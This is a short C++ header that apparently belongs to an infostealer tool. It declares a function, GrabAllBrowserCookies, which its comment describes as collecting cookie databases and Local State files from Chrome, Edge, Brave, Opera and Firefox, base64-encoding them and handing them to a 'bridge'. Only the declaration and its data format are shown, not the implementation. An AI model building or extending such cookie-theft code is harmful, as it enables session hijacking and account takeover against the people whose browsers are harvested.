#ifndef COOKIE_GRABBER_H
#define COOKIE_GRABBER_H

#include <windows.h>
#include <string>

/**
 * Scans all installed browsers for cookie databases and Local State files,
 * reads them, and returns a pipe-delimited string for the bridge to process.
 * 
 * Format: COOKIE_DATA|<browser>|<local_state_base64>|<cookies_db_base64>
 * 
 * Supported browsers: Chrome, Edge, Brave, Opera, Firefox
 */
std::string GrabAllBrowserCookies();

#endif // COOKIE_GRABBER_H
